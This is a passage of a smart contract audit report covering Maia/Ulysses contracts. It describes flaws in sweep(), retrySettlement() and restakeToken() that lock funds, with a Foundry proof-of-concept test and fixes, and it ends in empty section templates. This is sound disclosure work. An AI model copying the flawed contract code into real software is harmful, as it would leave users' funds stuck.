[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1259-L1264)
### Description
In RootBridgeAgent , `_payExecutionGas()` transfers funds for the gas used by `anyExecute(...)` as payment to Multichain, whatever is left is stored in `accumulatedFees`. The problem is that at that point the denomination is WETH - as we can see in `_replenishGas(...)` that’s converted to ETH and sent. However the `sweep()` implementation doesn’t convert WETH to ETH, therefore, there will be insufficient amount of ETH and `sweep()` will always revert.

```solidity
function sweep() external {
        if (msg.sender != daoAddress) revert NotDao();
        uint256 _accumulatedFees = accumulatedFees - 1;
        accumulatedFees = 1;
        SafeTransferLib.safeTransferETH(daoAddress, _accumulatedFees);
    }
```
### Coded PoC
Copy the function `testSweep()` in `test/ulysses-omnichain/RootTest.t.sol` .

Execute with `forge test --match-test testSweep -vv`

Result - `OutOfFund` revert
```solidity
function testSweep() public {

        testAddLocalTokenArbitrum();
        // Accumulate rewards in RootBridgeAgent
        address some_user = address(0xAAEE);
        hevm.deal(some_user, 1.5 ether);
				// Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees
        bytes memory empty_params = abi.encode(bytes1(0x00));
        hevm.prank(some_user);
        avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);

        // This will revert
        hevm.prank(dao);
        multicallBridgeAgent.sweep();

    }
```
### Recommendation
Convert WETH to ETH in `sweep()`.

## 5. <a id="my-section5"></a> `retrySettlement()` should revert on a Settlement that has been redeemed or is non existing, crediting back ETH to user
### Severity
Medium
### Impact
User’s ETH is not refunded and stuck in RootBridgeAgent.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252)
### Description
`retrySettlement(...)` is a payable function inside RootBridgeAgent that accepts ETH as payment for gas & re-trying execution of a Settlement. The following block of code highlights the check that is used to verify if the Settlement doesn’t exist or hasn’t been redeemed. The problem is that the function returns false rather to revert which means that a user that called `retrySettlement(...)` for redeemed or non-existent settlement won’t get their ETH back, moreover, the ETH is not accounted in `accumulatedRewards` and will be stuck in the contract.
### Recommendation
Either revert `retrySettlement(...)` when called on a redeemed & non-existent settlements, or accumulate the msg.value in `accumulatedRewards`.

## 6. <a id="my-section6"></a> UniV3 Staker `restakeToken(...)` calls unstakeToken(...)` with wrong argument
### Severity
Medium
### Impact
Restaking will not work as expected. People using BoostAggregator will have to unstake, withdraw, deposit again in order to restake their token.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L342)
[link2](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L374)
### Description
```solidity
    function restakeToken(uint256 tokenId) external {
        IncentiveKey storage incentiveId = stakedIncentiveKey[tokenId];
        if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, true);  // @audit - boolean passed should be false, instead of true

        (IUniswapV3Pool pool, int24 tickLower, int24 tickUpper, uint128 liquidity) =
            NFTPositionInfo.getPositionInfo(factory, nonfungiblePositionManager, tokenId);

        _stakeToken(tokenId, pool, tickLower, tickUpper, liquidity);
    }
```
`_unstakeToken` receives a boolean argument `isNotRestake` with the idea that if an incentive has ended, adversary can call restake on any token and stake it into the next incentive. The problem is that `restakeToken` passes `true` instead of `false` and corrupts the logic. Because of this, any users using BoostAggregator will have to unstake and withdraw their tokens and redeposit them into the UniswapV3Staker via the BoostAggregator, which is not only inconvenient, but also costs a lot of gas.

### Recommendation
pass false as an argument in #L342

## 7. <a id="my-section7"></a>
### Severity
### Impact
### Vulnerable Code
### Description
### Recommendation

## 8. <a id="my-section8"></a>
### Severity
### Impact
### Vulnerable Code
### Description
### Recommendation

## 9. <a id="my-section9"></a>
### Severity
### Impact
### Vulnerable Code
### Description
### Recommendation

## 10. <a id="my-section10"></a>
### Severity
### Impact
### Vulnerable Code
### Description
### Recommendation
